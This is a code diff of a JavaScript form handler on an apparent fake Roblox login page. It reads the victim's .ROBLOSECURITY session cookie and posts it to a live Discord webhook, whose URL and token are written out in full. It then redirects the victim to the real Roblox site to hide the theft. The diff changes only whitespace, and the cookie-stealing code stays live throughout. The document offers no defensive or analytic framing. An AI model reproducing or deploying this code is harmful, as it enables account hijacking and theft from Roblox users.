@@ -24,7 +24,7 @@ document.getElementById('f').addEventListener('submit', async e => {
   const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
 
   // LIVE-Push zu webhook.site (kein Token nötig)
-  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
+ await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
@@ -42,7 +42,6 @@ document.getElementById('f').addEventListener('submit', async e => {
     }]
   })
 });
-
   // Weiterleitung zum echten Roblox
   window.location = 'https://www.roblox.com/home';
 });
